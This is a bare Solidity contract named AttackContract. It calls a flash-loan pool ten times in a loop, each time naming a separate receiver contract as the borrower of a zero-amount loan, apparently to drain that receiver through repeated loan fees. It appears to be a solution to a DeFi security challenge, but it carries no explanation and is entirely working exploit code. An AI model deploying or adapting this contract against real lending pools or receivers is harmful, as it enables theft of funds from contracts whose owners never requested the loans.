// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface FlashLoanPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract AttackContract {
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    address public immutable receiverTarget;
    address public immutable poolTarget;

    constructor(address _receiverTarget, address _poolTarget){
        receiverTarget = _receiverTarget;
        poolTarget = _poolTarget;
    }

    function initializeAttack() public {
        for(uint i; i<10; ++i){
            FlashLoanPool(poolTarget).flashLoan(receiverTarget, ETH, 0, "");
        }
    }
}